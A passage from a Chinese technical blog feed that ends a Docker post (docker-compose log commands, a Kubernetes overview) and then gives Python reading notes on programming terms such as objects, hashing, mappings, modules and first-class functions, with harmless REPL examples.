logs<br>```<br>这个命令将显示Compose文件中定义的所有服务的日志输出。<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看Compose的实时日志：</span><br>docker-compose logs -f<br>```<br>这个命令将以实时方式显示Compose文件中定义的所有服务的日志输出。你可以通过按下`Ctrl + C`来停止实时日志输出。<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看特定服务的日志</span><br>docker-compose logs &lt;service_name&gt;<br>```<br>这个命令将显示指定服务的日志输出。你可以替换`&lt;service_name&gt;`为Compose文件中定义的服务名称。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看指定服务的实时日志：</span><br>docker-compose logs -f &lt;service_name&gt;<br>```<br>这个命令将以实时方式显示指定服务的日志输出。你可以替换`&lt;service_name&gt;`为Compose文件中定义的服务名称。<br></code></pre></td></tr></table></figure><h2 id="6-2-Kubernetes-K8S-简单介绍"><a href="#6-2-Kubernetes-K8S-简单介绍" class="headerlink" title="6.2 Kubernetes(K8S)简单介绍"></a>6.2 Kubernetes(K8S)简单介绍</h2><blockquote><p>开发只负责开发（拔掉开发的网线），其他杂七杂八的服务有运维通过K8S统一管理</p><p>比如说：开发连接数据库查询数据：只负责127.0.0.1本地连接即可，运维会在路由那里统一配置</p></blockquote><h3 id="6-2-2-Kubernetes介绍"><a href="#6-2-2-Kubernetes介绍" class="headerlink" title="6.2.2 Kubernetes介绍"></a>6.2.2 Kubernetes介绍</h3><p>Kubernetes（通常简称为K8s）是一个开源的容器编排平台，用于自动化部署、扩展和管理容器化应用程序。它提供了一个强大的工具集，用于管理和编排容器化应用程序的各个方面，如部署、扩缩容、负载均衡、服务发现、自愈性等。</p><p>以下是网上抄的Kubernetes的一些关键概念和特点：</p><ol><li>容器编排：Kubernetes设计用于管理容器化应用程序。它可以自动部署和管理容器，确保它们在集群中正确运行，并根据需要进行扩展和收缩。</li><li>高可用性：Kubernetes提供高可用性的架构，通过在集群中的多个节点上运行容器副本，并自动重新调度故障容器，确保应用程序的可用性。</li><li>自动化扩缩容：Kubernetes允许根据应用程序的负载情况自动扩展或收缩容器的数量。这样，你可以根据需求快速适应流量变化，提高应用程序的弹性和性能。</li><li>服务发现和负载均衡：Kubernetes提供内建的服务发现和负载均衡机制。它可以自动分配稳定的网络地址给容器，并将流量均匀分发到后端服务，确保应用程序的可访问性和高可用性。</li><li>状态管理：Kubernetes允许你声明性地定义应用程序的状态和要求。它可以管理应用程序的部署、更新和回滚操作，确保应用程序按照预期运行。</li><li>配置和存储管理：Kubernetes提供配置管理和存储管理功能。它可以管理应用程序的配置文件和敏感信息，并支持各种存储选项，如持久卷和分布式存储系统。</li><li>健康检查和自愈性：Kubernetes可以对容器进行健康检查，并在容器出现故障时自动重新调度或替换它们。这提高了应用程序的可靠性和稳定性。</li><li>插件生态系统：Kubernetes拥有丰富的插件生态系统，支持各种功能和扩展，如日志管理、监控、安全性、网络策略等。</li></ol><p>通过使用Kubernetes，你可以更方便地管理和扩展容器化应用程序，提高应用程序的可靠性和弹性。它提供了一个统一的平台，用于自动化管理容器的各个方面，并支持在多云、混合云和本地环境中的部署。+</p><h1 id="七、Docker-私有仓库【未完待续】"><a href="#七、Docker-私有仓库【未完待续】" class="headerlink" title="七、Docker 私有仓库【未完待续】"></a>七、Docker 私有仓库【未完待续】</h1><p>………………</p><p><img src="/../img/unsplash(1).jpg" alt="images1"></p>]]></content>
    
    
    <categories>
      
      <category>other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之编程术语（七）</title>
    <link href="/2024/01/07/617python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BC%96%E7%A8%8B%E6%9C%AF%E8%AF%AD%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <url>/2024/01/07/617python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BC%96%E7%A8%8B%E6%9C%AF%E8%AF%AD%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="第-7-章-编程术语"><a href="#第-7-章-编程术语" class="headerlink" title="第 7 章　编程术语"></a>第 7 章　编程术语</h1><h3 id="7-1-1-作为语言的Python和作为解释器的Python"><a href="#7-1-1-作为语言的Python和作为解释器的Python" class="headerlink" title="7.1.1　作为语言的Python和作为解释器的Python"></a>7.1.1　作为语言的Python和作为解释器的Python</h3><p>Python这个词有很多含义。Python编程语言的名字来自于英国喜剧团体Monty Python，而不是“蟒蛇”（尽管市面上的Python教程和文档有用“蟒蛇”来进行解释的）。同样，Python在计算机编程方面也有两种含义。</p><p>我们说“Python运行一个程序”或者“Python将抛出一个异常”时，我们是在谈论Python解释器——它是真实存在的软件，用来读取.py文件的文本并执行指令。当我们说“Python解释器”时，绝大多数情况下是指CPython，它是由Python软件基金会维护的Python解释器，可以在Python官网上找到。CPython是Python语言的一个实现，换言之，它是按照Python语言规范实现的软件，但Python并非仅此一种实现。CPython是用C语言编写的，Jython则是用Java编写的，用于运行和Java程序交互的Python脚本。PyPy是用Python语言编写的1，它是在程序执行时进行即时编译的编译器。</p><p>1用一种语言本身编写该语言的解释器或编译器称为自举。——译者注</p><p>所有这些实现都能运行用Python编程语言编写的源代码。当提及“这是一个Python程序”或者“我正在学习Python”时，其中的Python就是指Python编程语言。理想情况下，用Python语言编写的任何源代码都应该能被任何Python解释器运行，但实际上，解释器之间会有一些小的不兼容问题和细微差异。CPython被称为Python语言的参考实现，如果其他解释器在解释Python代码时跟CPython存在差异，那么一般认为CPython的行为是合规和正确的。</p><h3 id="7-1-2-垃圾回收"><a href="#7-1-2-垃圾回收" class="headerlink" title="7.1.2　垃圾回收"></a>7.1.2　垃圾回收</h3><p>Python使用<strong>垃圾回收</strong>机制避免此类错误，这是一种内存自动管理方式，它持续跟踪和判断内存应该何时分配和释放，程序员不再为此费力。垃圾回收就是内存的回收，它的作用是释放内存，让新数据使用。</p><h3 id="7-1-5-对象、值、实例和身份"><a href="#7-1-5-对象、值、实例和身份" class="headerlink" title="7.1.5　对象、值、实例和身份"></a>7.1.5　对象、值、实例和身份</h3><p>　<strong>对象</strong>是一条数据的呈现，比如数字、文本，或者更复杂的数据结构，比如列表或字典。所有对象都可以存储在变量中，作为参数传递给函数调用并作为函数调用的返回内容。</p><p>　　每个对象都有自己的值、身份和数据类型。<strong>值</strong>是对象所代表的数据，比如整数<code>42</code>或者字符串<code>&#39;hello&#39;</code>。虽然这有些令人困惑，但有些程序员使用术语“值”当作“对象”的同义词，特别是对于简单的数据类型，比如整数或字符串。例如，一个对应值为<code>42</code>的变量，既可以被解释为包含整数值42的变量，也可以被解释为包含一个值为42的整数对象的变量。</p><p><strong>变量的比喻：盒子还是标签</strong></p><p>许多入门书将变量比喻为一个盒子，这种比喻实际上过分简化了问题。把变量看作存储数值的盒子很容易理解，但这种比喻并不能阐述清楚变量和值的引用关系。以前面的<code>spam</code>和<code>eggs</code>为例，它们并不存储不同的字典，而是计算机内存中同一个字典的引用。</p><p><strong>许多书认为可以把变量视为包含数值的盒子</strong></p><p>在Python中，无论哪种数据类型的变量从技术角度上讲都是对值的引用，而非值的容器。盒子的比喻很简单易懂，但不完美。与其把变量想象成盒子，不如把它想象成内存中对象的标签。</p><p><strong>变量可以被视为值的标签</strong></p><p>多个变量可以引用同一个对象，反过来说，这个对象被“存储”在多个变量中。而用盒子做比喻，没法表现多个盒子存储同一个对象的情况。因此，标签的比喻可能更容易理解</p><p>如果不理解<code>=</code>赋值运算符是在复制引用而非对象本身，你可能会因此而犯错。幸运的是，整数、字符串和元组不存在这个问题，具体原因详见7.1.7节。</p><p>　　你可以使用<code>is</code>运算符比较两个对象的身份是否相同，而<code>==</code>运算符只检查它们的值是否相同。<code>x is y</code>可被视为<code>id(x) == id(y)</code>的简写。在交互式shell中，可以输入以下内容查看<code>is</code>和<code>==</code>的不同之处：</p><h3 id="7-1-6-项"><a href="#7-1-6-项" class="headerlink" title="7.1.6　项"></a>7.1.6　项</h3><p>　　在Python中，容器对象（比如列表或字典）中的子对象被称为“项”或者“元素”。比如列表<code>[&#39;dog&#39;, &#39;cat&#39;, &#39;moose&#39;]</code>中的字符串对象，也被称作“项”。</p><h3 id="7-1-7-可变和不可变"><a href="#7-1-7-可变和不可变" class="headerlink" title="7.1.7　可变和不可变"></a>7.1.7　可变和不可变</h3><p><strong>尽管元组中的对象是不能改变的，对象本身却是可以改变的</strong></p><p>几乎所有Python专家和我都把元组视为不可变的。但实际上，有些元组是否可以算是可变的取决于你的定义</p><h3 id="7-1-8-索引、键和哈希值"><a href="#7-1-8-索引、键和哈希值" class="headerlink" title="7.1.8　索引、键和哈希值"></a>7.1.8　索引、键和哈希值</h3><p>Python的列表和字典是一类可以包含多个其他值的值。为了访问这些子值，你可以使用<strong>索引运算符</strong>，它由一对中括号（<code>[ ]</code>）和一个被称为<strong>索引</strong>的整数组成。索引用于指定要访问哪个值。在交互式shell中输入以下内容，查看索引是如何在列表中工作的：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam[<span class="hljs-number">0</span>]</span><br>&#x27;cat&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam[-<span class="hljs-number">2</span>]</span><br>&#x27;dog&#x27;<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>0</code>是索引。最小的索引是0而不是1，因为Python（以及绝大多数编程语言）使用基于0的索引机制。使用基于1的索引机制的语言很少，其中最著名的是Lua和R语言。Python还支持负数索引，比如<code>-1</code>指的是列表的最后一项，<code>-2</code>指的是列表的倒数第二项，以此类推。你可以把负数索引<code>spam[-n]</code>看作<code>spam[len(spam)-n]</code>。</p><blockquote><p><strong>注意</strong>　计算机科学家、歌手、词曲作者Stan Kelly-Bootle曾开玩笑说：“数组索引应该从0开始还是从1开始呢？我提议的妥协方案是0.5，可惜他们未予认真考虑便一口回绝了。”</p></blockquote><p>　　你也可以在列表字面量上使用索引运算符，不过这些中括号在实际的代码中令人困惑，看起来也没有必要：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>][<span class="hljs-number">2</span>]<br><span class="hljs-string">&#x27;moose&#x27;</span><br></code></pre></td></tr></table></figure><p>　　索引也可以被用于除列表之外的其他值，比如在字符串上获取某个字符：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; <span class="hljs-string">&#x27;Hello, world&#x27;</span>[<span class="hljs-number">0</span>]<br><span class="hljs-string">&#x27;H&#x27;</span><br></code></pre></td></tr></table></figure><p>　　Python的字典是键−值对，如下所示：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Zophie&#x27;</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam[<span class="hljs-string">&#x27;name&#x27;</span>]</span><br>&#x27;Zophie&#x27;<br></code></pre></td></tr></table></figure><p>　　虽然Python的列表索引只能是一个整数，但字典的索引运算符是一个<strong>键</strong>，可以是任何可哈希的对象。<strong>哈希值</strong>是一个整数，它就像是某个值的“指纹”。一个对象的哈希值在这个对象的生命周期内永远不会改变，且具有相同值的对象必须有相同的哈希值。在上述示例中，字符串<code>&#39;name&#39;</code>是值<code>&#39;Zophie&#39;</code>对应的键。<code>hash()</code>函数可以返回可哈希对象的哈希值。字符串、整数、浮点数和元组等不可变对象都是可哈希的，而列表等可变对象是不可哈希的。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><br>-1734230105925061914<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>(<span class="hljs-number">42</span>)</span><br>42<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>(<span class="hljs-number">3.14</span>)</span><br>322818021289917443<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>((<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))</span><br>2528502973977326415<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])</span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>TypeError: unhashable type: &#x27;list&#x27;<br></code></pre></td></tr></table></figure><p>　　键的哈希值会被用来寻找存储在字典和集合数据类型中的项，具体细节不在本书讲述范围之内。因为列表是可变类型，不能被哈希，所以不能被当作字典的键：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">&gt;&gt;&gt; d = &#123;&#125;<br>&gt;&gt;&gt; d<span class="hljs-string">[[1, 2, 3]]</span> = <span class="hljs-string">&#x27;some value&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-built_in">module</span>&gt;<br>TypeError: unhashable <span class="hljs-built_in">type</span>: <span class="hljs-string">&#x27;list&#x27;</span><br></code></pre></td></tr></table></figure><p>　　哈希值不同于身份。两个具有相同值的不同对象的身份是不同的，但它们的哈希值是相同的。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = (<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">b = (<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(a), <span class="hljs-built_in">id</span>(b)</span><br>(37111992, 37112136)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(a) == <span class="hljs-built_in">id</span>(b) ❶</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>(a), <span class="hljs-built_in">hash</span>(b) ❷</span><br>(-3478972040190420094, -3478972040190420094)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">hash</span>(a) == <span class="hljs-built_in">hash</span>(b)</span><br>True<br></code></pre></td></tr></table></figure><p><code>a</code>和<code>b</code>所指向的元组有不同的身份❶，但它们的值相同，所以有相同的哈希值❷。注意，如果元组只包含可哈希的项，这个元组就是可哈希的，否则就是不可哈希的。因为字典中的键必须是可哈希的，所以不能将包含不可哈希列表的元组当作键。在交互式shell中输入以下内容：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tuple1 = (<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tuple2 = (<span class="hljs-string">&#x27;cat&#x27;</span>, [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>])</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = &#123;&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam[tuple1] = <span class="hljs-string">&#x27;a value&#x27;</span> ❶</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam[tuple2] = <span class="hljs-string">&#x27;another value&#x27;</span> ❷</span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>TypeError: unhashable type: &#x27;list&#x27;<br></code></pre></td></tr></table></figure><p>　　注意，<code>tuple1</code>是可哈希的❶，但<code>tuple2</code>含有不可哈希的列表❷，所以它是不可哈希的。</p><h3 id="7-1-9-容器、序列、映射和集合类型"><a href="#7-1-9-容器、序列、映射和集合类型" class="headerlink" title="7.1.9　容器、序列、映射和集合类型"></a>7.1.9　容器、序列、映射和集合类型</h3><p>　　<strong>容器</strong>、<strong>序列</strong>、<strong>映射</strong>这几个词在Python中的含义不一定等同于在其他编程语言中的含义。在Python中，容器是可以包含多个任意类型对象的对象。常见的容器类型包括列表和字典。</p><p>　　<strong>序列</strong>是容器数据类型的对象，它的元素有序且可以通过整数索引访问。字符串、元组、列表和字节对象都属于序列。这几种类型的对象可以通过索引访问对应数值，也可以作为参数传递给<code>len()</code>函数。有序指的是序列中有第一个值、第二个值，以此类推。比如，下面两个列表被认为是不相等的，因为它们的值的顺序不同：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&gt;&gt;&gt; <span class="hljs-comment">[1, 2, 3]</span> == <span class="hljs-comment">[3, 2, 1]</span><br>False<br></code></pre></td></tr></table></figure><p>　　<strong>映射</strong>也是容器数据类型的对象，它使用键而非索引访问。映射既可以是有序的，也可以是无序的。在Python 3.4和更早的版本中，字典是无序的，因为它没有所谓的第一个键−值对和最后一个键−值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>spam = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">4</span>&#125; <span class="hljs-comment"># 这是在CPython 3.5中运行的</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(spam.keys())<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam[<span class="hljs-string">&#x27;e&#x27;</span>] = <span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(spam.keys())<br>[<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>]<br></code></pre></td></tr></table></figure><p>　　Python的早期版本不能保证从字典中获取项的顺序。由于字典的无序性，两个键−值对顺序不同的字典字面量仍然被认为是相等的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span>&#125; == &#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>　　但是从Cpython 3.6开始，字典保留了键−值对的插入顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>spam = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">4</span>&#125; <span class="hljs-comment"># 该代码需要在Cpython 3.6中运行</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(spam)<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam[<span class="hljs-string">&#x27;e&#x27;</span>] = <span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(spam)<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>]<br></code></pre></td></tr></table></figure><p>这是CPython 3.6解释器的一个特性，它不存在于其他Python 3.6解释器中。但从Python 3.7开始，这一特性成为Python语言标准，所有Python 3.7解释器都支持了有序字典。但字典的有序性并不意味着它的项可以通过数字索引获取：<code>spam[0]</code>并不会返回有序字典中的第一项（除非凑巧第一项的键正好为0）。如果两个有序字典包含相同的键−值对，但键−值对的顺序不同，那么也会被认为是相等的。</p><p>　　<code>collections</code>模块包含很多其他映射类型，比如<code>OrderedDict</code>、<code>ChainMap</code>、<code>Counter</code>和<code>UserDict</code>。在Python官网上可以找到以上映射类型的介绍。</p><h3 id="7-1-10-特殊方法"><a href="#7-1-10-特殊方法" class="headerlink" title="7.1.10　特殊方法"></a>7.1.10　特殊方法</h3><p>　　<strong>特殊方法</strong>（dunder method）也被称为<strong>魔术方法</strong>，是指Python中名称以两个下划线开头和结尾的特殊方法。这些方法用于运算符重载。dunder是double underscore（双下划线）的缩写。最为人熟知的特殊方法是<code>__init__</code>（读作dunder init dunder，也可以直接读作init），其作用是初始化对象。Python有几十个特殊方法，第17章将详细解释。</p><h3 id="7-1-11-模块和包"><a href="#7-1-11-模块和包" class="headerlink" title="7.1.11　模块和包"></a>7.1.11　模块和包</h3><p>　　<strong>模块</strong>是可以被其他Python程序导入，将代码提供给导入者使用的程序。Python自带的模块被统称为Python标准库，你也可以创建自己的模块。如果一个程序被保存为spam.py，那么其他程序可以运行<code>import spam</code>来访问spam.py程序的函数、类和最上层的变量。</p><p>　　<strong>包</strong>是模块的集合，通过在文件夹中放置一个名为<code>__init__.py</code>的文件就可以形成一个包。这个文件夹的名称就是包的名称。包可以包含多个模块（也就是.py文件）或其他包（包含<code>__init__.py</code>文件的其他文件夹）。</p><p>　　关于模块和包的更多解释和细节，请查看Python官网上的相关文档。</p><h3 id="7-1-12-可调用对象和头等对象"><a href="#7-1-12-可调用对象和头等对象" class="headerlink" title="7.1.12　可调用对象和头等对象"></a>7.1.12　可调用对象和头等对象</h3><p>　　在Python中可调用的不只有函数和方法。<strong>可调用对象</strong>是指实现了可调用运算符（一对括号<code>()</code>）的对象。假设你有一条<code>def hello():</code>语句，可以把这段代码视为有一个名为<code>hello</code>的变量，它的值为一个函数对象，在这个变量上使用可调用运算符会调用<code>hello</code>变量对应的函数。</p><p>　　类是一个OOP概念。类就是可调用对象的例子，它并非函数或方法。例如，<code>datetime</code>模块中的<code>date</code>类，在<code>datetime.date(2020, 1, 1)</code>中通过可调用运算符调用。当类对象被调用时，这个类的<code>__init__</code>方法中的代码会被运行。第15章将介绍类的更多细节。</p><p>　　函数是Python中的头等对象，这意味着你可以把它们存储在变量中，在函数调用中作为参数传递，作为函数调用的返回值，也可以做任何能对对象做的事情。可以把<code>def</code>语句看作将一个函数对象赋值给变量。比如，可以创建一个<code>spam()</code>函数，然后调用它：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">spam</span>():</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Spam! Spam! Spam!&#x27;</span>)</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam()</span><br>Spam! Spam! Spam!<br></code></pre></td></tr></table></figure><p>　　也可以将<code>spam()</code>函数赋值给其他变量。当调用这个变量时，Python将执行<code>spam()</code>函数：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">eggs = spam</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">eggs()</span><br>Spam! Spam! Spam!<br></code></pre></td></tr></table></figure><p>这些被称为<strong>别名</strong>，是为已存在的函数起的其他名称。通常在重命名函数时会用到别名。但如果旧的名字被大量已有代码使用，那么修改名字的工作量很大。</p><p>　　头等对象最常见的用途是把函数作为参数传递给其他函数。比如，我们可以定义一个<code>callTwice()</code>函数，它可以接受一个需要被调用两次的函数作为参数：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">callTwice</span>(<span class="hljs-params">func</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    func()</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    func()</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">callTwice(spam)</span><br>Spam! Spam! Spam!<br>Spam! Spam! Spam!<br></code></pre></td></tr></table></figure><p>　　当然，你也可以直接在代码中写两次<code>spam()</code>。使用这种方式的好处是可以将<code>callTwice()</code>函数传递给任何一个在运行的函数，而不必在源代码中预先输入两次函数调用语句。</p><h2 id="7-2-经常被混淆的术语"><a href="#7-2-经常被混淆的术语" class="headerlink" title="7.2　经常被混淆的术语"></a>7.2　经常被混淆的术语</h2><p>　　术语本就够让人困惑的了，特别是那些含义上有关联但又不同的定义。更糟糕的是，编程语言、操作系统、计算机领域这三者可能会使用不同的术语来表示同一个事物，或者用相同的术语表示不同的事物。为了能与其他专业人员清楚地交流，你需要学习以下术语的区别。</p><h3 id="7-2-1-语句和表达式"><a href="#7-2-1-语句和表达式" class="headerlink" title="7.2.1　